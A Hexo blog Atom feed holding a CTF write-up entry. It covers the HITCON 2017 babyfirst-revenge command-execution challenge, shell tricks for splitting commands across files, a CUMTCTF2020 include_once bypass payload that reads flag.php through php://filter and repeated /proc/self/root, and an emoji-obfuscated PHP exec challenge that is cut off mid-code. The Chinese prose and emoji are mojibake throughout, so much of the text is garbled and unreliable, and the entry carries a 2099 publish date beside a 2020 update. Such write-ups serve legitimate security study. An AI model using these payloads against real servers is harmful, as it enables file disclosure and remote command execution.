<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pz1o</title>
  
  <subtitle>pz1o</subtitle>
  <link href="https://pz1o.top/atom.xml" rel="self"/>
  
  <link href="https://pz1o.top/"/>
  <updated>2020-11-20T14:19:52.357Z</updated>
  <id>https://pz1o.top/</id>
  
  <author>
    <name>pz1o</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å¤ç°wp</title>
    <link href="https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/"/>
    <id>https://pz1o.top/2099/09/28/%E5%A4%8D%E7%8E%B0wp/</id>
    <published>2099-09-28T02:18:17.000Z</published>
    <updated>2020-11-20T14:19:52.357Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="Hitcon2017-babyfirst-reveng"><a href="#Hitcon2017-babyfirst-reveng" class="headerlink" title="Hitcon2017 babyfirst-reveng"></a>Hitcon2017 babyfirst-reveng</h2><p>githubå¤ç°åœ°å€</p><p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><h3 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>å‘½ä»¤æ‰§è¡Œæ„é€ åå¼¹shell</p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>å…ˆè¯´å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;e\</span><br><span class="line">&gt;cho\</span><br><span class="line">&#39;123&#39;</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸­æ¢è¡Œå¯ä»¥æ‰§è¡Œé—´æ–­çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># vi 1  //åœ¨1ä¸‹å†™å…¥cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># touch flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># echo "cumtctf&#123;i_am_so_cute&#125;" &gt;&gt; flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># sh 1</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure><p>åœ¨Linuxä¸‹é¢å¯ä»¥é€šè¿‡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åå¯ä»¥é€šè¿‡<code>sh filename</code>æ¥æ‰§è¡Œæ–‡æœ¬é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœæœ‰æŠ¥é”™çš„è¯ä¼šè‡ªåŠ¨è·³è¿‡</p></blockquote><h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"><a href="#ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ" class="headerlink" title="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"></a>ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ</h2><h3 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>require_onceç»•è¿‡</p><p>æºç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>] != <span class="string">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>] != <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry, this site is only optimized for those who comes from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f'</span>])) </span><br><span class="line">  <span class="keyword">include_once</span>($_POST[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦é—®é¢˜æ˜¯<code>reuqire_once</code>çš„é—®é¢˜</p><p><a href="https://www.anquanke.com/post/id/213235#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235#h3-2</a></p><p>è¿™é‡Œé¢çš„æºç è§£ææœ‰å¾—è¿˜æ˜¯çœ‹ä¸æ‡‚ï¼Œæ—¥åå†ç¿»</p><p>é¦–å…ˆè¯´ä¸€ä¸‹phpæ–‡ä»¶åŒ…å«çš„æœºåˆ¶æ˜¯å°†<strong>å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­</strong>ï¼Œå½“å·²ç»<code>require_once(&#39;flag.php&#39;)</code>ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†<code>require_once</code>ã€‚</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure><blockquote><p>/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/</p><p>/proc/self/root/æŒ‡å‘/çš„ç¬¦å·</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p></blockquote><h2 id="ğŸ‘ğŸ™ŒğŸ˜ƒ"><a href="#ğŸ‘ğŸ™ŒğŸ˜ƒ" class="headerlink" title="ğŸ‘ğŸ™ŒğŸ˜ƒ"></a>ğŸ‘ğŸ™ŒğŸ˜ƒ</h2><h3 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>ä»£ç æ ¼å¼åŒ–ã€åæ··æ·†ï¼Œbcryptçˆ†ç ´ï¼Œ<strong>å‘½ä»¤æ‰§è¡Œ</strong></p><p>è¿™ä¸ªé¢˜ æˆ‘åªèƒ½è¯´çœŸçš„ç‰›é€¼</p><p>çœŸçš„å¼€çœ¼ç•Œ è¿˜å¯ä»¥è¿™æ ·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line">$ğŸ™=<span class="keyword">array</span>(<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‘'</span>,<span class="string">'ğŸ™’'</span>,<span class="string">'ğŸ™“'</span>,<span class="string">'ğŸ™”'</span>,<span class="string">'ğŸ™•'</span>,<span class="string">'ğŸ™–'</span>,<span class="string">'ğŸ™—'</span>,<span class="string">'ğŸ™˜'</span>,<span class="string">'ğŸ™™'</span>,<span class="string">'ğŸ™š'</span>,<span class="string">'ğŸ™›'</span>,<span class="string">'ğŸ™œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™Ÿ'</span>);</span><br><span class="line">$ğŸ™ =<span class="keyword">array</span>(<span class="string">'ğŸ™ '</span>,<span class="string">'ğŸ™¡'</span>,<span class="string">'ğŸ™¢'</span>,<span class="string">'ğŸ™£'</span>,<span class="string">'ğŸ™¤'</span>,<span class="string">'ğŸ™¥'</span>,<span class="string">'ğŸ™¦'</span>,<span class="string">'ğŸ™§'</span>,<span class="string">'ğŸ™¨'</span>,<span class="string">'ğŸ™©'</span>,<span class="string">'ğŸ™ª'</span>,<span class="string">'ğŸ™«'</span>,<span class="string">'ğŸ™¬'</span>,<span class="string">'ğŸ™­'</span>,<span class="string">'ğŸ™®'</span>,<span class="string">'ğŸ™¯'</span>);</span><br><span class="line">$ğŸ™°=<span class="keyword">array</span>(<span class="string">'ğŸ™°'</span>,<span class="string">'ğŸ™±'</span>,<span class="string">'ğŸ™²'</span>,<span class="string">'ğŸ™³'</span>,<span class="string">'ğŸ™´'</span>,<span class="string">'ğŸ™µ'</span>,<span class="string">'ğŸ™¶'</span>,<span class="string">'ğŸ™·'</span>,<span class="string">'ğŸ™¸'</span>,<span class="string">'ğŸ™¹'</span>,<span class="string">'ğŸ™º'</span>,<span class="string">'ğŸ™»'</span>,<span class="string">'ğŸ™¼'</span>,<span class="string">'ğŸ™½'</span>,<span class="string">'ğŸ™¾'</span>,<span class="string">'ğŸ™¿'</span>);</span><br><span class="line">$ğŸ˜€=<span class="keyword">array</span>(<span class="string">'ğŸ˜€'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‚'</span>,<span class="string">'ğŸ˜ƒ'</span>,<span class="string">'ğŸ˜„'</span>,<span class="string">'ğŸ˜…'</span>,<span class="string">'ğŸ˜†'</span>,<span class="string">'ğŸ˜‡'</span>,<span class="string">'ğŸ˜ˆ'</span>,<span class="string">'ğŸ˜‰'</span>,<span class="string">'ğŸ˜Š'</span>,<span class="string">'ğŸ˜‹'</span>,<span class="string">'ğŸ˜Œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>);</span><br><span class="line">$ğŸ˜=<span class="keyword">array</span>(<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‘'</span>,<span class="string">'ğŸ˜’'</span>,<span class="string">'ğŸ˜“'</span>,<span class="string">'ğŸ˜”'</span>,<span class="string">'ğŸ˜•'</span>,<span class="string">'ğŸ˜–'</span>,<span class="string">'ğŸ˜—'</span>,<span class="string">'ğŸ˜˜'</span>,<span class="string">'ğŸ˜™'</span>,<span class="string">'ğŸ˜š'</span>,<span class="string">'ğŸ˜›'</span>,<span class="string">'ğŸ˜œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜Ÿ'</span>);</span><br><span class="line">$ğŸ˜ =<span class="keyword">array</span>(<span class="string">'ğŸ˜ '</span>,<span class="string">'ğŸ˜¡'</span>,<span class="string">'ğŸ˜¢'</span>,<span class="string">'ğŸ˜£'</span>,<span class="string">'ğŸ˜¤'</span>,<span class="string">'ğŸ˜¥'</span>,<span class="string">'ğŸ˜¦'</span>,<span class="string">'ğŸ˜§'</span>,<span class="string">'ğŸ˜¨'</span>,<span class="string">'ğŸ˜©'</span>,<span class="string">'ğŸ˜ª'</span>,<span class="string">'ğŸ˜«'</span>,<span class="string">'ğŸ˜¬'</span>,<span class="string">'ğŸ˜­'</span>,<span class="string">'ğŸ˜®'</span>,<span class="string">'ğŸ˜¯'</span>);</span><br><span class="line">$ğŸ˜°=<span class="keyword">array</span>(<span class="string">'ğŸ˜°'</span>,<span class="string">'ğŸ˜±'</span>,<span class="string">'ğŸ˜²'</span>,<span class="string">'ğŸ˜³'</span>,<span class="string">'ğŸ˜´'</span>,<span class="string">'ğŸ˜µ'</span>,<span class="string">'ğŸ˜¶'</span>,<span class="string">'ğŸ˜·'</span>,<span class="string">'ğŸ˜¸'</span>,<span class="string">'ğŸ˜¹'</span>,<span class="string">'ğŸ˜º'</span>,<span class="string">'ğŸ˜»'</span>,<span class="string">'ğŸ˜¼'</span>,<span class="string">'ğŸ˜½'</span>,<span class="string">'ğŸ˜¾'</span>,<span class="string">'ğŸ˜¿'</span>);</span><br><span class="line">$ğŸ™€=<span class="keyword">array</span>(<span class="string">'ğŸ™€'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‚'</span>,<span class="string">'ğŸ™ƒ'</span>,<span class="string">'ğŸ™„'</span>,<span class="string">'ğŸ™…'</span>,<span class="string">'ğŸ™†'</span>,<span class="string">'ğŸ™‡'</span>,<span class="string">'ğŸ™ˆ'</span>,<span class="string">'ğŸ™‰'</span>,<span class="string">'ğŸ™Š'</span>,<span class="string">'ğŸ™‹'</span>,<span class="string">'ğŸ™Œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>);</span><br><span class="line">$ğŸ = <span class="keyword">array</span>($ğŸ™ ,$ğŸ™ ,$ğŸ™°,$ğŸ˜€,$ğŸ˜,$ğŸ˜ ,$ğŸ˜°,$ğŸ™€);</span><br><span class="line">$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™… = <span class="string">"strlen"</span>;</span><br><span class="line">$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰ = <span class="string">"chr"</span>;</span><br><span class="line">$ğŸ = <span class="string">"base64_decode"</span>;</span><br><span class="line">$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜ = <span class="string">"isset"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼<span class="params">($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (<span class="string">"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…"</span>)($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/<span class="number">4</span>;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = <span class="number">0</span>;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123;</span><br><span class="line">$ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">1</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">2</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =<span class="number">0</span>;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =<span class="number">0</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;<span class="number">8</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=<span class="number">0</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;<span class="number">16</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123;</span><br><span class="line"><span class="keyword">if</span>($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123;</span><br><span class="line">$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*<span class="number">16</span>+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(<span class="string">"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰"</span>)($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š = ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜œğŸ˜ƒğŸ˜ªğŸ˜¸ğŸ˜³ğŸ˜¹ğŸ˜‰ğŸ˜ƒğŸ˜´ğŸ˜ƒğŸ˜³ğŸ™†ğŸ˜±ğŸ˜˜ğŸ˜¢ğŸ™„ğŸ˜²ğŸ˜“ğŸ˜‰ğŸ™ŠğŸ˜©ğŸ˜§ğŸ˜…ğŸ˜»ğŸ˜©ğŸ˜½ğŸ˜‰ğŸ˜„ğŸ˜œğŸ™‡ğŸ˜ğŸ˜).ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ˜¡ğŸ˜)($_SERVER[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¥ğŸ˜»ğŸ˜¦ğŸ˜ğŸ˜¤ğŸ˜ğŸ˜¢ğŸ˜–ğŸ˜¨ğŸ˜€ğŸ˜–ğŸ˜•ğŸ˜¢ğŸ˜–ğŸ˜™ğŸ˜)]);</span><br><span class="line">ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ™„ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &amp;&amp; ($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜¦ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜)])) &#123;</span><br><span class="line">@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜€ğŸ˜·ğŸ˜œğŸ˜¨ğŸ˜šğŸ˜½ğŸ˜™ğŸ˜‘ğŸ˜ğŸ˜) . $ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ¯ = <span class="keyword">new</span> Bcrypt();</span><br><span class="line">$ğŸ”‘ = $_POST[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜—ğŸ˜–ğŸ™ŠğŸ˜³ğŸ˜ƒğŸ˜´ğŸ˜»)];</span><br><span class="line">$ğŸ”’ = 